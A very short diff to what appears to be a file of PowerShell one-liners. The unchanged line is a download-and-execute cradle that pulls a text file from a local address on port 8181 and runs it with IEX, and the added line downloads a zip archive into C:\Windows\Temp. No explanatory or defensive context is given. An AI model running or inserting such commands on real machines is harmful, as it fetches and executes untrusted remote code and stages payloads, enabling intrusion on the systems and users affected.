@@ -1,1 +1,4 @@
 powershell IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0:8181/file.txt')
+
+(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+
